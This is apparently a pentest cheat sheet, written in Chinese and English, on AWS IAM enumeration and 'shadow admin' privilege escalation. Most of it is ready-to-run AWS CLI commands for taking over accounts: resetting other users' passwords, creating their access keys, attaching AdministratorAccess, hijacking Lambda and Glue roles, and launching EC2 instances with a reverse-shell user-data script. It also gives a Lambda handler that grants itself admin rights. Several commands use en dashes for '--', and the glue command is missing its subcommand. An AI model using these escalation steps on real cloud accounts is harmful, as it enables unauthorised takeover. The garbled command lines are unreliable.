# AWS - 身份和访问管理 (Identity & Access Management / IAM)

## 列出 IAM 访问密钥 (Listing IAM access Keys)

```ps1
aws iam list-access-keys
```

## 列出 IAM 用户和组 (Listing IAM Users and Groups)

```ps1
aws iam list-users
aws iam list-groups
```

## 获取 IAM 详情 (Get IAM Details)

```ps1
aws iam get-account-authorization-details > iam.json
```

## 扮演特定角色 (Assume a Specific Role)

```ps1
aws sts assume-role --role-arn arn:aws:iam::${accountId}:role/${roleName} --role-session-name ${roleName}
```

## 使用 MFA 登录 (Login with MFA)

检索 MFA 设备 ARN：

```ps1
aws iam list-mfa-devices
```

然后创建会话令牌：

```ps1
aws sts get-session-token --serial-number ${arnMFADevice} --token-code ${MFACode}
```

## 影子管理员 (Shadow Admin)

### 管理员等效权限 (Admin equivalent permission)

- AdministratorAccess (管理员访问权限)

    ```powershell
    "Action": "*"
    "Resource": "*"
    ```

- **ec2:AssociateIamInstanceProfile** : 将 IAM 实例配置文件附加到 EC2 实例

    ```powershell
    aws ec2 associate-iam-instance-profile --iam-instance-profile Name=admin-role --instance-id i-0123456789
    ```

- **iam:CreateAccessKey** : 为另一个 IAM 管理员帐户创建新的访问密钥

    ```powershell
    aws iam create-access-key –user-name target_user
    ```

- **iam:CreateLoginProfile** : 添加新的基于密码的登录配置文件，为实体设置新密码并假冒该实体

    ```powershell
    aws iam create-login-profile –user-name target_user –password '|[3rxYGGl3@`~68)O{,-$1B”zKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}th)KZ7v?\\hq.#@dh49″=fT;|,lyTKOLG7J[qH$LV5U<9`O~Z”,jJ[iT-D^(' –no-password-reset-required
    ```

- **iam:UpdateLoginProfile** : 重置其他 IAM 用户的登录密码。

    ```powershell
    aws iam update-login-profile –user-name target_user –password '|[3rxYGGl3@`~68)O{,-$1B”zKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}th)KZ7v?\\hq.#@dh49″=fT;|,lyTKOLG7J[qH$LV5U<9`O~Z”,jJ[iT-D^(' –no-password-reset-required
    ```

- **iam:AttachUserPolicy**, **iam:AttachGroupPolicy** 或 **iam:AttachRolePolicy** : 将现有的管理员策略附加到其当前拥有的任何其他实体

    ```powershell
    aws iam attach-user-policy –user-name my_username –policy-arn arn:aws:iam::aws:policy/AdministratorAccess
    aws iam attach-user-policy –user-name my_username –policy-arn arn:aws:iam::aws:policy/AdministratorAccess
    aws iam attach-role-policy –role-name role_i_can_assume –policy-arn arn:aws:iam::aws:policy/AdministratorAccess
    ```

- **iam:PutUserPolicy**, **iam:PutGroupPolicy** 或 **iam:PutRolePolicy** : 添加的内联策略将允许攻击者向先前受侵害的实体授予额外的权限。

    ```powershell
    aws iam put-user-policy –user-name my_username –policy-name my_inline_policy –policy-document file://path/to/administrator/policy.json
    ```

- **iam:CreatePolicy** : 添加隐蔽的管理员策略
- **iam:AddUserToGroup** : 添加到组织的管理员组中。

    ```powershell
    aws iam add-user-to-group –group-name target_group –user-name my_username
    ```

- **iam:UpdateAssumeRolePolicy** + **sts:AssumeRole** : 更改特权角色的 assumption 权限，然后使用非特权帐户扮演该角色。

    ```powershell
    aws iam update-assume-role-policy –role-name role_i_can_assume –policy-document file://path/to/assume/role/policy.json
    ```

- **iam:CreatePolicyVersion** & **iam:SetDefaultPolicyVersion** : 更改客户管理的策略并将非特权实体更改为特权实体。

    ```powershell
    aws iam create-policy-version –policy-arn target_policy_arn –policy-document file://path/to/administrator/policy.json –set-as-default
    aws iam set-default-policy-version –policy-arn target_policy_arn –version-id v2
    ```

- **lambda:UpdateFunctionCode** : 使攻击者能够访问与附加到该函数的 Lambda 服务角色关联的权限。

    ```powershell
    aws lambda update-function-code –function-name target_function –zip-file fileb://my/lambda/code/zipped.zip
    ```

- **glue:UpdateDevEndpoint** : 使攻击者能够访问与特定 Glue 开发端点关联的角色相关的权限。

    ```powershell
    aws glue –endpoint-name target_endpoint –public-key file://path/to/my/public/ssh/key.pub
    ```

- **iam:PassRole** + **ec2:CreateInstanceProfile**/**ec2:AddRoleToInstanceProfile** : 攻击者可以创建一个新的特权实例配置文件，并将其附加到他所拥有的受损 EC2 实例。

- **iam:PassRole** + **ec2:RunInstance** : 授予攻击者对实例配置文件/角色拥有的权限集的访问权限，这同样可以从没有权限提升到具有 AWS 帐户的完全管理员访问权限。

    ```powershell
    # 添加 ssh 密钥
    $ aws ec2 run-instances –image-id ami-a4dc46db –instance-type t2.micro –iam-instance-profile Name=iam-full-access-ip –key-name my_ssh_key –security-group-ids sg-123456
    # 执行反弹 shell
    $ aws ec2 run-instances –image-id ami-a4dc46db –instance-type t2.micro –iam-instance-profile Name=iam-full-access-ip –user-data file://script/with/reverse/shell.sh
    ```

- **iam:PassRole** + **lambda:CreateFunction** + **lambda:InvokeFunction** : 授予用户对帐户中存在的任何 Lambda 服务角色关联的权限的访问权限。

    ```powershell
    aws lambda create-function –function-name my_function –runtime python3.6 –role arn_of_lambda_role –handler lambda_function.lambda_handler –code file://my/python/code.py
    aws lambda invoke –function-name my_function output.txt
    ```

    code.py 示例

    ```python
    import boto3
    def lambda_handler(event, context):
        client = boto3.client('iam')
        response = client.attach_user_policy(
        UserName='my_username',
        PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
        )
        return response
    ```

- **iam:PassRole** + **glue:CreateDevEndpoint** : 获取与帐户中存在的任何 Glue 服务角色相关联的权限的访问权限。

    ```powershell
    aws glue create-dev-endpoint –endpoint-name my_dev_endpoint –role-arn arn_of_glue_service_role –public-key file://path/to/my/public/ssh/key.pub
    ```

## 参考资料 (References)

- [Cloud Shadow Admin Threat 10 Permissions Protect - CyberArk](https://www.cyberark.com/threat-research-blog/cloud-shadow-admin-threat-10-permissions-protect/)
